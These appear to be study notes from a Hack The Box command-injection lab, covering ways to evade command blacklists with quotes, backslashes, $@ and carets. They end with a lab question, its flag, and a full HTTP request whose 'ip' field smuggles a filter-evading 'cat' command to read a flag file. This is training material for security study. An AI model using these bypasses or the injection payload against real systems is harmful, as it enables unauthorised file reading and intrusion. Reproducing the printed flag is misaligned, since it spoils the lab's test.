# Bypassing Blacklisted Commands
## Linux & Windows
Single-quote `'` and a double-quote `"` are ignored:

```
w'h'o'am'i
w"h"o"am"i
```

The important things to remember are that we cannot mix types of quotes and the number of quotes must be even. 

## Linux Only
This works exactly as it did with the quotes, but in this case, the number of characters do not have to be even, and we can insert just one of them if we want to:

```
who$@ami
w\ho\am\i
```

## Windows Only

```
who^ami
```

## Questions
1. Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found. **Answer: HTB{b451c_f1l73r5_w0n7_570p_m3}**
   - `cat` command is blacklisted, bypass with single-quote:
        ```
        POST / HTTP/1.1
        Host: 154.57.164.81:32341
        Content-Length: 77
        Cache-Control: max-age=0
        Accept-Language: en-US,en;q=0.9
        Origin: http://154.57.164.81:32341
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://154.57.164.81:32341/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ip=0.0.0.0%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
        ```